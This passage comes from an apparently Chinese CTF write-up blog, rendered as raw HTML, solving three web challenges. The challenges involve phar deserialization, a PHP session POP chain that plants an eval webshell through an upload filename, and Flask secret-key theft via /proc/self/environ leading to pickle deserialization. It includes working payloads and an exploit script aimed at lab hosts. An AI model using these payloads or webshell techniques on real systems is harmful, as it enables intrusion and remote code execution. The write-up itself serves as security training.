class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span><span class="hljs-variable">%09</span><span class="hljs-variable">%E20</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%AC31</span><span class="hljs-variable">%B9D</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C82</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B0Rr</span><span class="hljs-variable">%CB</span><span class="hljs-variable">%CCI-</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%2</span>C.I<span class="hljs-variable">%CD</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%2</span>CI-J<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C9</span>/R<span class="hljs-variable">%B2</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%05</span>kI<span class="hljs-variable">%CBIL</span><span class="hljs-variable">%07</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%03</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>Fd<span class="hljs-variable">%A5</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%95</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%05</span><span class="hljs-variable">%94</span>G<span class="hljs-variable">%18</span><span class="hljs-variable">%E2g</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%01</span>tvIjq<span class="hljs-variable">%89</span><span class="hljs-variable">%5</span>EIE<span class="hljs-variable">%09</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%90</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%EE</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%D1t</span><span class="hljs-variable">%10</span><span class="hljs-variable">%CDSW</span><span class="hljs-variable">%7</span>Fc<span class="hljs-variable">%1</span>B<span class="hljs-variable">%C4g</span><span class="hljs-variable">%60</span><span class="hljs-variable">%F9</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%F3</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%13</span><span class="hljs-variable">%F6L</span><span class="hljs-variable">%99</span><span class="hljs-variable">%7</span>D<span class="hljs-variable">%FA</span><span class="hljs-variable">%FD</span><span class="hljs-variable">%3</span>FM<span class="hljs-variable">%BB</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%FE</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%99</span><span class="hljs-variable">%80</span>r<span class="hljs-variable">%EEN</span><span class="hljs-variable">%BEN</span><span class="hljs-variable">%00</span><span class="hljs-variable">%B3C</span><span class="hljs-variable">%29</span><span class="hljs-variable">%E40</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>&amp;<span class="hljs-number">1</span><span class="hljs-operator">=</span>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span><span class="hljs-comment">;s:1:&quot;w&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032338264.png" alt="image-20250303233824159"></p><p>读取phar文件，反序列化使得读出flag文件名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>=phar:///tmp/<span class="hljs-number">838420275</span>bace68a89cc4842eecbe6b5.jpg&amp;<span class="hljs-number">1</span>=O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032339128.png" alt="image-20250303233950802"></p><p>然后我们修改pop链，重复上面步骤，</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%8</span>B<span class="hljs-variable">%08</span><span class="hljs-variable">%08</span><span class="hljs-variable">%15</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%C5g</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span>fixed_test.phar<span class="hljs-variable">%00</span>s<span class="hljs-variable">%F7t</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%B0L</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B1</span>/<span class="hljs-variable">%C8</span><span class="hljs-variable">%28</span>P<span class="hljs-variable">%88</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%F7p</span><span class="hljs-variable">%F4</span><span class="hljs-variable">%09</span><span class="hljs-variable">%89</span>w<span class="hljs-variable">%F6</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%F0</span><span class="hljs-variable">%F4q</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%D2</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%B4V</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%E5z</span><span class="hljs-variable">%C8</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%08</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%82</span>P<span class="hljs-variable">%9</span>A<span class="hljs-variable">%81</span>a<span class="hljs-number">5</span><span class="hljs-variable">%10</span><span class="hljs-variable">%FB</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%99</span>X<span class="hljs-variable">%29</span><span class="hljs-variable">%95</span><span class="hljs-variable">%14</span><span class="hljs-variable">%A5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%2</span>AY<span class="hljs-variable">%19</span>YU<span class="hljs-variable">%17</span><span class="hljs-variable">%83</span>xy<span class="hljs-variable">%89</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%A9J</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%FEV</span><span class="hljs-variable">%A6VJ</span><span class="hljs-variable">%89</span><span class="hljs-variable">%05</span><span class="hljs-variable">%0590</span><span class="hljs-variable">%19</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%04</span><span class="hljs-variable">%90</span><span class="hljs-variable">%95</span><span class="hljs-variable">%98</span>Y<span class="hljs-variable">%A4de</span><span class="hljs-variable">%08</span><span class="hljs-variable">%126</span><span class="hljs-variable">%B4R</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span><span class="hljs-variable">%09</span><span class="hljs-variable">%E20</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%1</span>A<span class="hljs-variable">%AC31</span><span class="hljs-variable">%B9D</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C82</span><span class="hljs-variable">%042</span><span class="hljs-variable">%83</span><span class="hljs-variable">%0</span>Br<span class="hljs-variable">%DC2sR</span><span class="hljs-variable">%FD</span><span class="hljs-variable">%93</span><span class="hljs-variable">%B2RA</span><span class="hljs-variable">%82</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%60</span><span class="hljs-variable">%D5i9</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%20</span><span class="hljs-variable">%15</span><span class="hljs-variable">%16</span>VJ<span class="hljs-variable">%FAi</span><span class="hljs-variable">%20</span>N<span class="hljs-variable">%3</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%8</span>B<span class="hljs-variable">%D0</span><span class="hljs-variable">%EBg</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%01</span>tmIjq<span class="hljs-variable">%89</span><span class="hljs-variable">%5</span>EIE<span class="hljs-variable">%09</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%90</span><span class="hljs-variable">%DDt</span><span class="hljs-variable">%EEh</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%88</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%24</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%BC</span><span class="hljs-variable">%22</span><span class="hljs-variable">%9</span>Er<span class="hljs-variable">%7</span>B.u<span class="hljs-variable">%E7</span><span class="hljs-variable">%DA</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>B~<span class="hljs-variable">%DB</span><span class="hljs-variable">%F0</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%26</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%BB</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%13</span><span class="hljs-variable">%00</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%EC</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%27</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span>&amp;<span class="hljs-number">1</span><span class="hljs-operator">=</span>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span><span class="hljs-comment">;s:1:&quot;w&quot;;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>=phar:///tmp/<span class="hljs-number">68</span>af76eb7c0cce5005fc66f33b7641b0.jpg&amp;<span class="hljs-number">1</span>=O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032351202.png" alt="image-20250303235100847"></p><p>有人写了一个半自动化的脚本，实测可行</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br>url=<span class="hljs-string">&#x27;http://66388d68-d21a-41fd-a86f-154fc4107bbc.node5.buuoj.cn:81/&#x27;</span><br>def sign(<span class="hljs-type">name</span>):<br>    f = <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-keyword">read</span>() # 修改内容后的phar文件<br>    s = f[:<span class="hljs-number">-28</span>] # 获取要签名的数据<br>    h = f[<span class="hljs-number">-8</span>:] # 获取签名类型以及GBMB标识<br>    newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB<br>    <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;signed.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).<span class="hljs-keyword">write</span>(newf) # 写入新文件<br>def compress(<span class="hljs-type">name</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        content = f1.<span class="hljs-keyword">read</span>()<br>        f = gzip.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;signed.phar.gz&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>        f.<span class="hljs-keyword">write</span>(content)<br>        f.<span class="hljs-keyword">close</span>()<br>def <span class="hljs-keyword">write</span>(<span class="hljs-type">name</span>):<br>    #O:<span class="hljs-number">1</span>:&quot;D&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:&quot;start&quot;;s:<span class="hljs-number">1</span>:&quot;w&quot;;&#125;<br>    r=requests.post(url,data=&#123;<span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-keyword">open</span>(<span class="hljs-type">name</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-keyword">read</span>(),<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#125;i:0;i:0;&#125;&#x27;</span>&#125;)<br>    print(r.text)<br>def <span class="hljs-keyword">read</span>(<span class="hljs-type">name</span>):<br>    #O:<span class="hljs-number">1</span>:&quot;D&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:&quot;start&quot;;s:<span class="hljs-number">1</span>:&quot;r&quot;;&#125;<br>    r=requests.post(url,data=&#123;<span class="hljs-string">&#x27;0&#x27;</span>:<span class="hljs-string">&#x27;phar://&#x27;</span>+<span class="hljs-type">name</span>,<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;a:2:&#123;i:0;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#125;i:0;i:0;&#125;&#x27;</span>&#125;)<br>    print(r.text)<br>def make():<br>    sign(<span class="hljs-string">&#x27;test.phar&#x27;</span>)<br>    compress(<span class="hljs-string">&#x27;signed.phar&#x27;</span>)<br>    <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;signed.phar.gz&#x27;</span>)<br><br><br><br><br># make()<br># /tmp/<span class="hljs-number">001</span>df3ffd61e2faa164eee6783ff929b.jpg<br># <span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;/tmp/001df3ffd61e2faa164eee6783ff929b.jpg&#x27;</span>)<br># fflaggg<br><br># make()<br># /tmp/b1fe36a1465497f88cd1568a157e30d2.jpg<br># <span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;/tmp/b1fe36a1465497f88cd1568a157e30d2.jpg&#x27;</span>)<br># flag&#123;<span class="hljs-number">149</span>dd7e1<span class="hljs-number">-4</span>cd8<span class="hljs-number">-4590</span>-aff2-bae99e772daa&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503040004698.png" alt="image-20250304000440588"></p><h1 id="DASCTF-X-GFCTF-2024｜四月开启第一局-web1234"><a href="#DASCTF-X-GFCTF-2024｜四月开启第一局-web1234" class="headerlink" title="[DASCTF X GFCTF 2024｜四月开启第一局]web1234"></a>[DASCTF X GFCTF 2024｜四月开启第一局]web1234</h1><p>没有前端，用dirsearch扫出&#x2F;robots.txt和<a href="http://www.zip/">www.zip</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041424811.png" alt="image-20250224225954012"></p><p>下载<a href="http://www.zip,原来是源码/">www.zip，原来是源码</a></p><p>代码审计，获得登录方式</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252248659.png" alt="image-20250225224848542"></p><p>在class.php中找到初始值</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252250857.png" alt="image-20250225225006754"></p><p>md5解码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252251501.png" alt="image-20250225225101228"></p><p>登录成功<code>http://ce62e496-2433-41bd-878a-963385664769.node5.buuoj.cn:81/?uname=admin&amp;passwd=1q2w3e</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252342616.png" alt="image-20250225234217473"></p><p>根据提示，这里是session反序列化，</p><blockquote><p>启动了session_start以后，就会找sess_XXX里的内容进行反序列化，反序列化后得到$Session对象，比如下面的aaa|O:6:”Config”:…就是对应的$_SESSION[‘aaa’]，然后在程序执行完要退出之前，会重新把$SESSION写进sess_XXX文件，也就是序列化的过程，从而触发_sleep</p><p>(即写回去的时候就是序列化前面反序列化的对象)</p><p>这种Session的设计理念其实很好理解，如若不然，session存用户的登录状态，用户每次访问，哪怕所有属性都原封不动没有改变，代码都得手动设置$_SESSION[‘user’]&#x3D;xxx，这样显然是不合理的</p><p>事实上$_SESSION[‘user’]&#x3D;xxx往往只用于改变用户属性</p></blockquote><p>上面我们讲了session触发sleep函数，然后我们构造pop链如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mail</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$telnum</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br><span class="hljs-variable">$log</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log</span>();<br><span class="hljs-variable">$log</span> -&gt; data = <span class="hljs-string">&quot;log_start()&quot;</span>;<br><span class="hljs-variable">$config</span>-&gt;avatar = <span class="hljs-variable">$log</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><p>为啥这样？请看下面三段代码</p><p>事实上，我们最后是想通过<code>log()</code>（即第二段代码）将我们的一句话木马写入record.php，</p><p>所以我们要通过<code>editconf()</code>（即第一段代码）去执行<code>log()</code>，注意看，执行<code>log()</code>的要求是<code>filesize(&quot;record.php&quot;) &gt; 0</code>，就是说record.php不能为空，</p><p>这就需要我们用上面的pop链做到，<code>Config.__sleep -&gt; Config.showconf() -&gt; Log.__toString </code>，通过pop链执行<code>Log.__toString </code>，从而将<code>&lt;?php\nerror_reporting(0);\n</code>写入record.php，使record.php不为空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editconf</span>(<span class="hljs-params"><span class="hljs-variable">$avatar</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$sex</span>, <span class="hljs-variable">$mail</span>, <span class="hljs-variable">$telnum</span></span>)</span>&#123;<br>    <span class="hljs-comment">//编辑表单内容</span><br>    <span class="hljs-variable">$Config</span> = <span class="hljs-variable language_">$this</span>-&gt;Config;<br><br>    <span class="hljs-variable">$Config</span>-&gt;avatar = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$avatar</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-variable">$Config</span>-&gt;sex = (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/男|女/&quot;</span>, <span class="hljs-variable">$sex</span>, <span class="hljs-variable">$matches</span>) ? <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;武装直升机&quot;</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;mail = (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.*@.*\..*/&#x27;</span>, <span class="hljs-variable">$mail</span>) ? <span class="hljs-variable">$mail</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-variable">$Config</span>-&gt;telnum = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$telnum</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;Config = <span class="hljs-variable">$Config</span>;<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/tmp/Config&quot;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Config</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&quot;record.php&quot;</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>        [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Log</span>(<span class="hljs-variable">$Config</span>),<span class="hljs-string">&quot;log&quot;</span>]();<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span><span class="hljs-params">()</span>&#123;<br>        file_put_contents(<span class="hljs-string">&#x27;record.php&#x27;</span>, $<span class="hljs-keyword">this</span>-&gt;data, FILE_APPEND);<br>    &#125;<br></code></pre></td></tr></table></figure><p>原理明白了之后，我们形成利用session的payload：<code>aaa|O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:&#123;s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;&#125;s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;&#125;</code></p><p>然后用payload制作sess_matrix文件，上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260003232.png" alt="image-20250226000355114"></p><p>然后在文件名处写马，⽂件名为 1’;eval($_POST[1]);# 即可</p><p>注意删去Cookie，防止再次写入<code>&lt;?php\nerror_reporting(0);\n</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260005977.png" alt="image-20250226000516856"></p><p>连接蚁剑，出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260007741.png" alt="image-20250226000752628"></p><p>这里只能在文件名处写马，其他地方都会转义</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260020801.png" alt="image-20250226002020699"></p><h1 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h1><p>根据指引和文件读取漏洞找到源码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261145038.png" alt="image-20250226114531775"></p><p>读了源码，发现有pickle-Python序列化漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br></code></pre></td></tr></table></figure><p>但是需要从session入手，</p><p>所以我们需要知道密钥，尝试读取&#x2F;proc&#x2F;self&#x2F;environ，得到</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261201178.png" alt="image-20250226120119760"></p><p>然后破解</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab">命令<br>python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&#x27;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.Z78ADQ.DR7XN1thWnwnuFYHVh44LXAqBRE&#x27;</span> -s <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span><br>结果<br>b&#x27;&#123;<span class="hljs-string">&quot;u&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&quot;</span>&#125;&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p>我们可以知道，需要构造的秘钥结构：{“u”:{“b”:“反序列化的内容”}}</p><p>（注意一定要在Linux系统里运行下面脚本）</p><p>原因是windows和linux使用pickie.loads()反序列化的内部过程不太一样, 所以也就导致了在windows下可以通过loads()执行的内容放到linux下使用loads()加载就会失败, 所以我们需要把代码放到 linux环境里跑，得到一个base64</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span 